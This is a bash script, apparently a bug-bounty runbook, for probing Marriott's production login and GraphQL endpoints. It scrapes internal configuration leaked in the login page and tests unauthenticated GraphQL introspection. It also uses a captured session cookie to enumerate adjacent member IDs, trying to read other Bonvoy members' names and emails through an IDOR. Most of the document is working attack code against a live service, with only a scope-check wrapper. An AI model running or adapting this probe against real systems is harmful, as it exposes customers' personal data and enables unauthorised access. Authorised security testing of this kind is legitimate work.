#!/usr/bin/env bash
# PI-RUNBOOK-session23-graphql-idor.sh
#
# SESSION 23 — Phoenix GraphQL IDOR via /api/getNextProps (M022)
#
# INTELLIGENCE FROM SESSION 22 (__NEXT_DATA__ leak on login page):
#   apolloEnvVars.APOLLOGRAPHQL_FULL_NGINX_ENDPOINT =
#     http://mi-nginx-app-green.phoenix-prod1.svc.cluster.local:80/v1/graph/query
#   NEXT_PUBLIC_PRE_PROCESSING_URL =
#     http://mi-nginx-app-green/phoenix-account-preprocessor
#
# ARCHITECTURE:
#   Browser → POST auth-apc.marriott.com/api/getNextProps
#          → Next.js server → mi-nginx-app-green:80/v1/graph/query
#          → Phoenix GraphQL backend (phoenix-prod1 K8s namespace)
#
# OBJECTIVE (M022 — CRITICAL IDOR hypothesis):
#   1. Obtain valid Marriott Bonvoy session cookie (free account)
#   2. Extract operationSignatures from __NEXT_DATA__ (allowlist hashes)
#   3. Test /api/getNextProps for GraphQL introspection (unauthenticated)
#   4. With session: enumerate phoenixAccount* operations
#   5. IDOR test: substitute another member's ID into account queries
#
# PHASES:
#   A  — Extract operationSignatures + serverENV from login page __NEXT_DATA__
#   B  — Test /api/getNextProps unauthenticated (introspection / __typename)
#   C  — [NEEDS SESSION] Authenticated GraphQL query using captured cookie
#   D  — [NEEDS SESSION] IDOR probe: substitute member IDs in account queries
#   E  — Decode JWT from cookie (if present) for member ID extraction
#
# PREREQ:
#   Create free Marriott Bonvoy account at marriott.com → log in from desktop
#   browser → DevTools → Application → Cookies → copy cookie header string
#   Set BONVOY_COOKIE below before running Phase C/D.
#
# SCOPE CHECK:
#   auth-apc.marriott.com = IN-SCOPE (explicit)

set -euo pipefail
OUTDIR=/tmp/s23
mkdir -p "$OUTDIR"
exec > >(tee "$OUTDIR/session23.log") 2>&1

SCOPE_SCRIPT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../../" && pwd)/scripts/scope-check.sh"
SCOPE_FILE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../../" && pwd)/config/marriott-scope.yaml"

scope_check() {
  result=$(SCOPE_FILE="$SCOPE_FILE" "$SCOPE_SCRIPT" "$1" 2>&1) || true
  echo "scope[$1] => $result"
  echo "$result" | grep -q "^IN-SCOPE" || { echo "SKIP: $1 OUT-OF-SCOPE"; return 1; }
}

UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36"
BASE="https://auth-apc.marriott.com"

# SET THIS before running Phase C/D:
# Paste the full Cookie: header string from your browser DevTools
BONVOY_COOKIE="${BONVOY_COOKIE:-}"

scope_check "auth-apc.marriott.com" || exit 1

# ─────────────────────────────────────────────────────────────────────────────
echo "================================================================"
echo "PHASE A — Extract operationSignatures + serverENV from __NEXT_DATA__"
echo "================================================================"

echo "--- A1: Fetch login page ---"
curl -s --max-time 25 \
  -A "$UA" \
  -H "Accept: text/html,application/xhtml+xml" \
  "${BASE}/login" \
  -o "$OUTDIR/login.html" 2>/dev/null
LOGIN_SIZE=$(wc -c < "$OUTDIR/login.html")
echo "A1: login HTML: ${LOGIN_SIZE}B"
sleep 2

echo ""
echo "--- A2: Extract operationSignatures and serverENV ---"
python3 - <<'PYEOF' 2>&1 | tee "$OUTDIR/operation-signatures.txt"
import re, json, sys

html = open("/tmp/s23/login.html", errors='replace').read()

m = re.search(r'<script[^>]+id=["\']__NEXT_DATA__["\'][^>]*>(.*?)</script>', html, re.DOTALL)
if not m:
    print("ERROR: __NEXT_DATA__ not found")
    sys.exit(1)

try:
    data = json.loads(m.group(1))
except Exception as e:
    print(f"JSON parse error: {e}")
    sys.exit(1)

props = data.get('props', {}).get('pageProps', {})

# 1. operationSignatures — GraphQL persisted query allowlist
op_sigs = props.get('operationSignatures', {})
print(f"=== operationSignatures ({len(op_sigs)} entries) ===")
if isinstance(op_sigs, dict):
    for op_name, sig in sorted(op_sigs.items()):
        print(f"  {op_name}: {sig}")
elif isinstance(op_sigs, list):
    for item in op_sigs:
        print(f"  {item}")
else:
    print(f"  type={type(op_sigs).__name__}: {str(op_sigs)[:500]}")

# 2. serverENV — may contain API URLs, feature flags, env type
server_env = props.get('serverENV', {})
print(f"\n=== serverENV ({len(server_env) if isinstance(server_env, dict) else '?'} keys) ===")
if isinstance(server_env, dict):
    for k, v in sorted(server_env.items()):
        if str(v):
            print(f"  {k} = {v}")

# 3. apolloEnvVars — confirmed internal K8s endpoint
apollo = props.get('apolloEnvVars', {})
print(f"\n=== apolloEnvVars ===")
if isinstance(apollo, dict):
    for k, v in sorted(apollo.items()):
        print(f"  {k} = {v}")

# 4. deployedEnvType — prod/staging/dev?
env_type = props.get('deployedEnvType', 'NOT FOUND')
print(f"\n=== deployedEnvType: {env_type} ===")

# 5. headerFilterFeatureFlag
hfff = props.get('headerFilterFeatureFlag', 'NOT FOUND')
print(f"=== headerFilterFeatureFlag: {hfff} ===")

# 6. Full buildId
print(f"\nbuildId: {data.get('buildId', 'NOT FOUND')}")
print(f"runtimeConfig keys: {list(data.get('runtimeConfig', {}).keys())}")
PYEOF
sleep 1

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE B — /api/v1/graph/query probe (confirmed accessible, returns 403)"
echo "================================================================"
# NOTE: /api/getNextProps returns 000 (firewalled externally).
# /api/v1/graph/query returns Akamai 403 type #18 (IP ACL block — not auth).
# /mi/query returns 500/1115B on GET — ORIGIN REACHED. Primary target for POST.

GQL_PATH="/mi/query"

echo "--- B1: GET /api/v1/graph/query (no auth) — confirm 403 ---"
touch "$OUTDIR/b1-headers.txt" "$OUTDIR/b1-body.txt"
curl -sv --max-time 15 \
  -A "$UA" \
  -D "$OUTDIR/b1-headers.txt" \
  "${BASE}${GQL_PATH}" \
  -o "$OUTDIR/b1-body.txt" 2>&1 | grep -E "HTTP/|< [Cc]ontent|< [Ss]erver|< [Ww]ww-[Aa]uth|< [Ll]ocation|< [Xx]-" | head -10 || true
B1_CODE=$(grep -m1 "^HTTP" "$OUTDIR/b1-headers.txt" 2>/dev/null | tr -d '\r' || echo "000")
B1_SIZE=$(wc -c < "$OUTDIR/b1-body.txt" 2>/dev/null || echo 0)
echo "B1: GET ${GQL_PATH} (no auth): $B1_CODE (${B1_SIZE}B)"
head -c 300 "$OUTDIR/b1-body.txt" 2>/dev/null || true
sleep 2

echo ""
echo "--- B2: POST /api/v1/graph/query — __typename (no auth) ---"
touch "$OUTDIR/b2-headers.txt" "$OUTDIR/b2-body.txt"
curl -sv --max-time 15 \
  -A "$UA" \
  -H "Content-Type: application/json" \
  -H "Origin: ${BASE}" \
  -H "x-application-name: account" \
  -H "x-client-name: phoenix_account" \
  -H "x-client-version: v1" \
  -X POST \
  -d '{"query":"{__typename}"}' \
  -D "$OUTDIR/b2-headers.txt" \
  "${BASE}${GQL_PATH}" \
  -o "$OUTDIR/b2-body.txt" 2>&1 | grep -E "HTTP/|< [Cc]ontent|< [Ss]erver|< [Ww]ww-[Aa]uth" | head -8 || true
B2_CODE=$(grep -m1 "^HTTP" "$OUTDIR/b2-headers.txt" 2>/dev/null | tr -d '\r' || echo "000")
B2_SIZE=$(wc -c < "$OUTDIR/b2-body.txt" 2>/dev/null || echo 0)
echo "B2: POST __typename (no auth): $B2_CODE (${B2_SIZE}B)"
head -c 400 "$OUTDIR/b2-body.txt" 2>/dev/null || true
sleep 2

echo ""
echo "--- B3: POST /api/v1/graph/query — introspection (no auth) ---"
touch "$OUTDIR/b3-headers.txt" "$OUTDIR/b3-body.txt"
curl -s --max-time 15 \
  -A "$UA" \
  -H "Content-Type: application/json" \
  -H "x-application-name: account" \
  -X POST \
  -d '{"query":"{ __schema { queryType { name } types { name kind } } }"}' \
  -D "$OUTDIR/b3-headers.txt" \
  "${BASE}${GQL_PATH}" \
  -o "$OUTDIR/b3-body.txt" 2>/dev/null || true
B3_CODE=$(grep -m1 "^HTTP" "$OUTDIR/b3-headers.txt" 2>/dev/null | tr -d '\r' || echo "000")
B3_SIZE=$(wc -c < "$OUTDIR/b3-body.txt" 2>/dev/null || echo 0)
echo "B3: POST introspection (no auth): $B3_CODE (${B3_SIZE}B)"
head -c 400 "$OUTDIR/b3-body.txt" 2>/dev/null || true
sleep 2

echo ""
echo "--- B4: Alternate GraphQL paths probe ---"
for path in \
  "/mi/query" \
  "/query" \
  "/api/query" \
  "/api/v1/graph/query" \
  "/v1/graph/query" \
  "/mi/account/api/v1/graph/query"
do
  touch "$OUTDIR/b4-$(echo "$path" | tr '/' '-').txt"
  resp=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 8 \
    -A "$UA" "${BASE}${path}" 2>/dev/null || echo "000|0")
  code=$(echo "$resp" | cut -d'|' -f1)
  size=$(echo "$resp" | cut -d'|' -f2)
  echo "B4 ${path}: ${code}/${size}B"
  sleep 1
done

echo ""
echo "--- B5: POST /mi/query — GraphQL probe (no auth) ---"
# /mi/query returned 500/1115B on GET — origin reached. Now test with POST + query body.
touch "$OUTDIR/b5-typename-headers.txt" "$OUTDIR/b5-typename-body.txt"
curl -sv --max-time 20 \
  -A "$UA" \
  -H "Content-Type: application/json" \
  -H "Origin: ${BASE}" \
  -H "x-application-name: account" \
  -H "x-client-name: phoenix_account" \
  -H "x-client-version: v1" \
  -X POST \
  -d '{"query":"{__typename}"}' \
  -D "$OUTDIR/b5-typename-headers.txt" \
  "${BASE}/mi/query" \
  -o "$OUTDIR/b5-typename-body.txt" 2>&1 | grep -E "HTTP/|< [Cc]ontent|< [Ss]erver|< [Ww]ww-[Aa]uth|< [Xx]-" | head -10 || true
B5T_CODE=$(grep -m1 "^HTTP" "$OUTDIR/b5-typename-headers.txt" 2>/dev/null | tr -d '\r' || echo "000")
B5T_SIZE=$(wc -c < "$OUTDIR/b5-typename-body.txt" 2>/dev/null || echo 0)
echo "B5 POST /mi/query __typename (no auth): $B5T_CODE (${B5T_SIZE}B)"
head -c 600 "$OUTDIR/b5-typename-body.txt" 2>/dev/null || true
sleep 2

echo ""
echo "--- B6: POST /mi/query — introspection (no auth) ---"
touch "$OUTDIR/b6-introspect-headers.txt" "$OUTDIR/b6-introspect-body.txt"
curl -s --max-time 20 \
  -A "$UA" \
  -H "Content-Type: application/json" \
  -H "x-application-name: account" \
  -X POST \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind } } }"}' \
  -D "$OUTDIR/b6-introspect-headers.txt" \
  "${BASE}/mi/query" \
  -o "$OUTDIR/b6-introspect-body.txt" 2>/dev/null || true
B6_CODE=$(grep -m1 "^HTTP" "$OUTDIR/b6-introspect-headers.txt" 2>/dev/null | tr -d '\r' || echo "000")
B6_SIZE=$(wc -c < "$OUTDIR/b6-introspect-body.txt" 2>/dev/null || echo 0)
echo "B6 POST /mi/query introspection (no auth): $B6_CODE (${B6_SIZE}B)"
head -c 800 "$OUTDIR/b6-introspect-body.txt" 2>/dev/null || true
sleep 2

echo ""
echo "--- B7: GET /mi/query — full 500 response body ---"
touch "$OUTDIR/b7-get-body.txt"
curl -s --max-time 15 \
  -A "$UA" \
  -H "Accept: application/json" \
  "${BASE}/mi/query" \
  -o "$OUTDIR/b7-get-body.txt" 2>/dev/null || true
B7_SIZE=$(wc -c < "$OUTDIR/b7-get-body.txt" 2>/dev/null || echo 0)
echo "B7 GET /mi/query full body (${B7_SIZE}B):"
cat "$OUTDIR/b7-get-body.txt" 2>/dev/null || true

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE C — Authenticated GraphQL (NEEDS BONVOY_COOKIE)"
echo "================================================================"

if [ -z "$BONVOY_COOKIE" ]; then
  echo "SKIP Phase C: BONVOY_COOKIE not set."
  echo ""
  echo "  PRIMARY GraphQL endpoint: POST ${BASE}/mi/query (returned 500 on GET = origin live)"
  echo ""
  echo "  To test authenticated GraphQL:"
  echo "  1. Sign up: https://www.marriott.com/loyalty/enrollment/enrollmentStart.mi"
  echo "     OR: https://www.marriott.com/loyalty/enrollment/enrollmentLanding.mi"
  echo "  2. Log in at: https://auth-apc.marriott.com/login"
  echo "  3. Browser DevTools → Network tab → any request → copy 'Cookie:' header"
  echo "  4. Re-run: BONVOY_COOKIE='MI_USER=...;' bash $0"
else
  echo "--- C1: POST /api/v1/graph/query — __typename (auth) ---"
  touch "$OUTDIR/c1-headers.txt" "$OUTDIR/c1-body.txt"
  curl -sv --max-time 15 \
    -A "$UA" \
    -H "Content-Type: application/json" \
    -H "Cookie: ${BONVOY_COOKIE}" \
    -H "Origin: ${BASE}" \
    -H "x-application-name: account" \
    -H "x-client-name: phoenix_account" \
    -H "x-client-version: v1" \
    -X POST \
    -d '{"query":"{__typename}"}' \
    -D "$OUTDIR/c1-headers.txt" \
    "${BASE}${GQL_PATH}" \
    -o "$OUTDIR/c1-body.txt" 2>&1 | grep -E "HTTP/|< [Cc]ontent|< [Ss]erver|< [Ss]et-[Cc]ookie|< [Ww]ww-[Aa]uth" | head -8 || true
  C1_CODE=$(grep -m1 "^HTTP" "$OUTDIR/c1-headers.txt" 2>/dev/null | tr -d '\r' || echo "000")
  C1_SIZE=$(wc -c < "$OUTDIR/c1-body.txt" 2>/dev/null || echo 0)
  echo "C1: POST __typename (auth): $C1_CODE (${C1_SIZE}B)"
  head -c 400 "$OUTDIR/c1-body.txt" 2>/dev/null || true
  sleep 2

  echo ""
  echo "--- C2: POST phoenixAccountProfile (auth) ---"
  touch "$OUTDIR/c2-headers.txt" "$OUTDIR/c2-body.json"
  curl -s --max-time 20 \
    -A "$UA" \
    -H "Content-Type: application/json" \
    -H "Cookie: ${BONVOY_COOKIE}" \
    -H "Origin: ${BASE}" \
    -H "x-application-name: account" \
    -H "x-client-name: phoenix_account" \
    -H "x-client-version: v1" \
    -X POST \
    -d '{"operationName":"phoenixAccountProfile","query":"query phoenixAccountProfile { me { id firstName lastName email membershipLevel points { total } } }","variables":{}}' \
    -D "$OUTDIR/c2-headers.txt" \
    "${BASE}${GQL_PATH}" \
    -o "$OUTDIR/c2-body.json" 2>/dev/null || true
  C2_CODE=$(grep -m1 "^HTTP" "$OUTDIR/c2-headers.txt" 2>/dev/null | tr -d '\r' || echo "000")
  C2_SIZE=$(wc -c < "$OUTDIR/c2-body.json" 2>/dev/null || echo 0)
  echo "C2: phoenixAccountProfile: $C2_CODE (${C2_SIZE}B)"
  head -c 600 "$OUTDIR/c2-body.json" 2>/dev/null || true
  sleep 2

  echo ""
  echo "--- C3: POST — extract own member ID from profile ---"
  python3 - <<'PYEOF' 2>/dev/null | tee "$OUTDIR/member-id.txt"
import json, re

try:
    data = json.loads(open("/tmp/s23/c2-body.json").read())
    me = data.get('data', {}).get('me', {})
    print(f"Member ID: {me.get('id', 'NOT FOUND')}")
    print(f"Name: {me.get('firstName', '')} {me.get('lastName', '')}")
    print(f"Email: {me.get('email', 'NOT FOUND')}")
    print(f"Level: {me.get('membershipLevel', 'NOT FOUND')}")
except Exception as e:
    print(f"Parse error: {e}")
    print(open("/tmp/s23/c2-body.json", errors='replace').read()[:300])
PYEOF
fi

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE D — IDOR Probe (NEEDS member IDs from Phase C)"
echo "================================================================"

if [ -z "$BONVOY_COOKIE" ]; then
  echo "SKIP Phase D: Requires authenticated session from Phase C."
else
  # Extract own member ID from C3 output
  OWN_ID=$(grep "Member ID:" "$OUTDIR/member-id.txt" 2>/dev/null | head -1 | awk '{print $NF}' || echo "")
  echo "Own member ID: ${OWN_ID:-NOT EXTRACTED}"

  if [ -n "$OWN_ID" ] && [ "$OWN_ID" != "NOT" ]; then
    echo ""
    echo "--- D1: Enumerate adjacent IDs (integer +/-1, +/-2) ---"
    # Try numeric increment/decrement if ID is numeric or UUID-based
    # For UUID IDs: try known patterns from other Marriott Bonvoy member numbers
    python3 - <<PYEOF 2>/dev/null | tee "$OUTDIR/idor-candidates.txt"
import re
own_id = "$OWN_ID"
print(f"Own ID: {own_id}")

# If numeric
if own_id.isdigit():
    base = int(own_id)
    candidates = [str(base + i) for i in [-100, -10, -2, -1, 1, 2, 10, 100]]
    print("Type: NUMERIC")
    print("Candidates:", candidates)
elif re.match(r'^[0-9a-f-]{36}$', own_id.lower()):
    print("Type: UUID — cannot enumerate; use member number format instead")
    print("Try: query with membershipNumber field from profile response")
else:
    print(f"Type: UNKNOWN format '{own_id[:20]}'")
    print("Try: extract numeric membership number from profile")
PYEOF

    echo ""
    echo "--- D2: phoenixAccountProfile with adjacent IDs ---"
    CANDIDATES=$(python3 -c "
import re
own_id = '$OWN_ID'
if own_id.isdigit():
    base = int(own_id)
    print(' '.join([str(base + i) for i in [-2, -1, 1, 2]]))
" 2>/dev/null || echo "")

    if [ -n "$CANDIDATES" ]; then
      for test_id in $CANDIDATES; do
        resp_file="$OUTDIR/idor-${test_id}.json"
        curl -s --max-time 15 \
          -A "$UA" \
          -H "Content-Type: application/json" \
          -H "Cookie: ${BONVOY_COOKIE}" \
          -X POST \
          -d "{\"operationName\":\"phoenixAccountProfile\",\"query\":\"query phoenixAccountProfile(\$id: ID!) { account(id: \$id) { id firstName lastName email } }\",\"variables\":{\"id\":\"${test_id}\"}}" \
          "${BASE}/api/getNextProps" \
          -o "$resp_file" 2>/dev/null || true
        resp_size=$(wc -c < "$resp_file" 2>/dev/null || echo 0)
        echo "D2 id=${test_id}: ${resp_size}B"
        # Check if it returned data (non-null, non-error)
        if python3 -c "
import json, sys
d = json.loads(open('$resp_file').read())
acc = d.get('data', {}).get('account')
if acc and acc.get('id') and acc.get('id') != '$OWN_ID':
    print('!!! IDOR: Got account data for id=$test_id !!!')
    print(acc)
    sys.exit(0)
" 2>/dev/null; then
          echo "!!! IDOR CONFIRMED for id=${test_id} — stop, collect evidence !!!"
          break
        fi
        sleep 2
      done
    else
      echo "D2: ID format not enumerable — need membership number extraction"
    fi
  else
    echo "D1: Could not extract own member ID — run Phase C first"
  fi
fi

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE E — Decision Gate"
echo "================================================================"

python3 - <<'PYEOF' 2>&1
import os, re, json

outdir = "/tmp/s23"
print("=== SESSION 23 DECISION GATE ===\n")

# Phase A: operationSignatures
sig_file = f"{outdir}/operation-signatures.txt"
if os.path.exists(sig_file):
    sigs = open(sig_file).read()
    n_sigs = len(re.findall(r'  \w+:', sigs))
    if n_sigs > 0:
        print(f"A (operationSignatures): {n_sigs} operations allowlisted")
        print("  → Persisted query mode: must use exact operation names from the list")
        print("  → Check if 'operationName' alone (no query body) is accepted (bypasses allowlist check)")
    else:
        print("A (operationSignatures): NONE — open queries accepted (no allowlist)")
        print("  → Can send arbitrary GraphQL queries")

    # Show apollo endpoint
    for line in sigs.split('\n'):
        if 'NGINX_ENDPOINT' in line or 'nginx' in line.lower():
            print(f"  Internal endpoint confirmed: {line.strip()}")

# Phase B: unauthenticated access
for phase, fname in [('B1 GET', 'b1-headers.txt'), ('B2 POST __typename', 'b2-body.txt'), ('B3 introspection', 'b3-body.txt')]:
    fpath = f"{outdir}/{fname}"
    if os.path.exists(fpath):
        content = open(fpath).read()
        if 'data' in content.lower() or '__typename' in content or 'querytype' in content.lower():
            print(f"{phase}: !!! RESPONDS WITHOUT AUTH — check {fname} !!!")
        elif '401' in content or '403' in content or 'unauthorized' in content.lower():
            print(f"{phase}: Auth-gated (expected)")
        elif '200' in content:
            print(f"{phase}: 200 response — check body for data vs empty")
        else:
            headers_f = fpath.replace('body', 'headers').replace('.txt', '.txt')
            hdr = open(f"{outdir}/b1-headers.txt").read() if 'b1' in fname else open(f"{outdir}/b2-headers.txt").read() if 'b2' in fname else open(f"{outdir}/b3-headers.txt").read() if 'b3' in fname else ""
            code = next((l.strip() for l in hdr.split('\n') if 'HTTP' in l), '???')
            print(f"{phase}: {code}")

# Phase C: authenticated
if os.path.exists(f"{outdir}/c2-body.json"):
    try:
        body = json.loads(open(f"{outdir}/c2-body.json").read())
        me = body.get('data', {}).get('me', {})
        if me.get('id'):
            print(f"\nC (authenticated): !!! GRAPHQL WORKS WITH SESSION !!!")
            print(f"  Own ID: {me.get('id', 'N/A')}")
            print(f"  → Now run Phase D IDOR probe")
        elif body.get('errors'):
            print(f"\nC (authenticated): GraphQL responded but got errors: {body['errors'][:1]}")
        else:
            print(f"\nC (authenticated): Unexpected response — check c2-body.json")
    except:
        print(f"\nC (authenticated): Not run (BONVOY_COOKIE not set)")
else:
    print(f"\nC/D (authenticated): NOT RUN — set BONVOY_COOKIE and re-run script")

print("\n=== NEXT ACTIONS ===")
print("1. If operationSignatures empty → send arbitrary queries to /api/getNextProps")
print("2. If B2/B3 returns data without auth → CRITICAL unauthenticated GraphQL")
print("3. Create Marriott Bonvoy account → set BONVOY_COOKIE → re-run for Phase C/D")
print("4. In Phase C: extract own member ID → in Phase D: test adjacent IDs")
print("5. If account(id: <other>) returns data → IDOR confirmed (Critical, M022)")
PYEOF

echo ""
echo "================================================================"
echo "SESSION 23 COMPLETE"
echo "Key files:"
echo "  $OUTDIR/operation-signatures.txt — GraphQL operation allowlist"
echo "  $OUTDIR/b2-body.txt              — unauthenticated POST response"
echo "  $OUTDIR/b3-body.txt              — unauthenticated introspection"
echo "  $OUTDIR/c2-body.json             — authenticated profile query"
echo "  $OUTDIR/member-id.txt            — own member ID (for IDOR)"
echo "================================================================"
